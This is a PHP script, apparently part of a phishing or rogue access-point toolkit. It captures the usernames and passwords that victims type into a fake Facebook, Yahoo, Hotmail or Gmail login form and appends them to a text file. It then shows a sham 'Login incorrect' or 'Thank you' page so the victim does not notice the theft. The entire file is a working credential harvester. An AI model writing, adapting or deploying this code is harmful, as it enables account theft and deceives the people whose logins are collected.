<?php
//Copyright 2014 VulpiArgenti
//Thanks to devi1 for help re-coding this

$name = $_POST['login'];
$password = $_POST['password'];

if($_POST['facebook']){
	$service = "facebook";
}elseif($_POST['yahoo']){
	$service = "yahoo";
}elseif($_POST['hotmail']){
	$service = "hotmail";
}elseif($_POST['gmail']){
	$service = "gmail";
}

$accinfo = "login: $name\npass: $password\nservice: $service\n-----\n";

$fp = fopen("formdata.txt", "a");
fwrite($fp, $accinfo);
fclose($fp);

sleep(1);

$error =
"<html>\n" .
"<head>\n" .
"<meta http-equiv=\"Refresh\" content=\"5;url=/\" />\n" .
"</head>\n" .
"<body>\n" .
"<center><p1><b>Login incorrect.</b></p1></center>\n" .
"<center><p1>You are being redirected.</p1></center>\n" .
"</body>\n" .
"</html>";

$success=
"<html>\n" .
"<head>\n" .
"</head>\n" .
"<body>\n" .
"<center><p1>Thank you</p1></center>\n" .
"<center><p1>Refresh browser to continue</p1></center>\n" .
"</body>\n" .
"</html>";

if(($password == "") || ($name == "")){
echo $error;
}else{ echo $success;
}




//uncomment to debug $_POST variable:
//print_r($_POST);

//uncomment to list name, password, and service variables:
//echo('$name: ' . $name . '<br>$password: ' . $password . '<br>$service: ' . $service);

?>
